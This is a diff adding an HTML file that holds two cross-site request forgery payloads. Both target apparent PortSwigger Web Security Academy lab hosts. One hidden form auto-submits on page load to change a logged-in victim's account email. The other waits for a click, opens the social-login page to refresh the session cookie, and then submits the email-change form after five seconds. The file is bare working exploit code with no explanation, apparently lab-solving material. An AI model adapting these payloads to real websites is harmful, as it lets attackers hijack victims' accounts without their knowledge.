@@ -1,0 +1,21 @@
+<form method="POST" action="https://0a4d00ac030fb2fc808dd5b4007f0047.web-security-academy.net/my-account/change-email ">
+    <input type="hidden" name="email" value="0xyf@0xyf.local">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
